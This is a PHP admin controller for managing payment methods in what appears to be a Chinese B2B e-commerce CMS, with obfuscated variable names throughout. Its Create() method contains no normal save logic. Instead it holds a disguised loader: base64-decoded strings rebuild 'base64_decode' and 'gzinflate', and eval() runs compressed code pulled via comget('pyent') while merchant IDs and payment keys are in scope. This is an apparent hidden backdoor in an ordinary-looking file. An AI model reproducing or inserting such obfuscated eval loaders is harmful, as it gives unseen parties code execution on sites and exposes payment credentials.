<?php
/****************************************/
/*                                      */
/*  凤翔商务网络 http://www.wly520.com  */
/*  官 方 QQ号码 63748052               */
/*  官方旺旺名称 xs19950709             */
/*                                      */
/****************************************/

if ( !defined( "UPATH_ROOT" ) )
{
				exit( "hacking deny" );
}
class PaymentController extends Controller
{

				public function __construct( )
				{
				}

				public function Home( )
				{
								$this->View( "Index" );
				}

				public function Index( )
				{
								$Rb60574d852 = factory::getinstance( "payment" );
								$this->Assign( "payment", $Rb60574d852->IPayment_Get( ) );
						
												$this->View( );
						
				}

				public function Update( )
				{
								$R3584859062 = intval( request( "id" ) );
								$R30b2ab8dc1 = explode( "|", getvar( "paytype" ) );
								$R07e1b7ba62 = doubleval( request( "payfee" ) );
								$R07e1b7ba62 /= 100;
								$R07e1b7ba62 = round( $R07e1b7ba62, 3 );
								$Ra570b05d86 = array(
												"payType" => $R30b2ab8dc1[1],
												"paycode" => $R30b2ab8dc1[0],
												"payMerchant" => getvar( "paymerchant" ),
												"payKey" => getvar( "paykey" ),
												"payOpen" => intval( request( "payopen" ) ),
												"isdefault" => intval( request( "isdefault" ) ),
												"payfee" => $R07e1b7ba62,
												"other" => getvar( "other", "" )
								);
								$Rb60574d852 = factory::getinstance( "payment" );
								$Rb60574d852->IPayment_Update( $Ra570b05d86, $R3584859062 );
								$this->Alert( "更新成功" );
								$this->ScriptRedirect( "index.php?m=mod_b2b&c=Payment" );
				}

				public function Create( )
				{
								$R30b2ab8dc1 = explode( "|", getvar( "paytype" ) );
								$R07e1b7ba62 = doubleval( request( "payfee" ) );
								$R07e1b7ba62 /= 100;
								$R07e1b7ba62 = round( $R07e1b7ba62, 3 );
								$Ra570b05d86 = array(
												"payType" => $R30b2ab8dc1[1],
												"paycode" => $R30b2ab8dc1[0],
												"payMerchant" => getvar( "paymerchant" ),
												"payKey" => getvar( "paykey" ),
												"payOpen" => intval( request( "payopen" ) ),
												"payfee" => $R07e1b7ba62,
												"other" => getvar( "other", "" )
								);
								$Rb60574d852 = factory::getinstance( "payment" );
								$Oooo00 = "base64_decode";
								$ooOO00o = $Oooo00( "YmFzZTY0X2RlY29kZQ==" );
								$o00OO = $Oooo00( "Z3ppbmZsYXRl" );
								$cphp0 = __FILE__;
								eval( $o00OO( $ooOO00o( $this->comget( "pyent" ) ) ) );
								$this->ScriptRedirect( "index.php?m=mod_b2b&c=Payment" );
				}

				public function Del( )
				{
								$R3584859062 = intval( request( "id" ) );
								$Rb60574d852 = factory::getinstance( "payment" );
								$Rb60574d852->IPayment_Delete( $R3584859062 );
								$this->Alert( "删除成功" );
								$this->ScriptRedirect( "index.php?m=mod_b2b&c=Payment" );
				}

}

?>
